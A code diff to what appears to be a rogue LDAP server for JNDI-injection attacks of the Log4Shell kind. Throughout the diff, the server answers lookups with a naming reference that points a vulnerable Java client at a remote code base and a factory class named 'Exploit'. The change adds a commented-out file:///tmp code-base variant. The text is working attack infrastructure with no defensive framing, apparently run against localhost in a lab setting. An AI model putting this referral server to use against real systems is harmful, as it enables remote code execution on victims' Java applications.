@@ -28,7 +28,8 @@ public class Application {
     private static final int PORT = 12345;
 
     private static final String OBJECT_CLASS = "javaNamingReference";
-    private static final String JAVA_CODE_BASE = "http://localhost:8080/code";
+    private static final String JAVA_CODE_BASE_URL = "http://localhost:8080/code";
+    private static final String JAVA_CODE_BASE_FILE = "file:///tmp";
     private static final String JAVA_FACTORY = "Exploit";
     private static final String JAVA_CLASS_NAME = "foo";
 
@@ -75,10 +76,11 @@ public class Application {
 
         protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry entry) throws LDAPException {
             logger.info("sendResult: Send LDAP reference result for '{}' redirecting to '{}' with factory '{}' and class '{}'",
-                    base, JAVA_CODE_BASE, JAVA_FACTORY, JAVA_CLASS_NAME);
+                    base, JAVA_CODE_BASE_URL, JAVA_FACTORY, JAVA_CLASS_NAME);
 
             entry.addAttribute("javaClassName", JAVA_CLASS_NAME);
-            entry.addAttribute("javaCodeBase", JAVA_CODE_BASE + "/" + base + "/#" + JAVA_CLASS_NAME);
+            entry.addAttribute("javaCodeBase", JAVA_CODE_BASE_URL + "/" + base + "/#" + JAVA_CLASS_NAME);
+//            entry.addAttribute("javaCodeBase", JAVA_CODE_BASE_FILE + "/#" + JAVA_CLASS_NAME);
             entry.addAttribute("objectClass", OBJECT_CLASS);
             entry.addAttribute("javaFactory", JAVA_FACTORY);
 
